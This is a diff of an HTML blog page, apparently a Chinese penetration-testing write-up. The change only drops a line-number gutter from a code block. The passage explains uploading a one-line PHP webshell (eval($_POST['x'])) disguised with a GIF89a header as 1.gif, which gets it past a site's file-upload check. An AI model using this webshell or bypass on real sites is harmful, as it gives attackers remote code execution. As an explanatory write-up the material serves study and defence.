@@ -74,7 +74,7 @@
 <h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>首先，我们在首页注册随便注册一个用户登录之后，在用户中心 -&gt; 我的留言这个模块去上传一句话木马文件。</p>
 <p><img src="/uploads/2019/06/4195263459.png" alt="1.png"></p>
 <p>然后我们写一个一句话木马文件，文件内容：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'x'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">eval</span>($_POST[<span class="string">'x'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>文件后缀为 <code>1.gif</code></p>
 <p>这个 <code>1.gif</code> 是一句话木马文件，使用的是GIF89a头的GIF文件欺骗，使其能够上传后不被改文件后缀。</p>
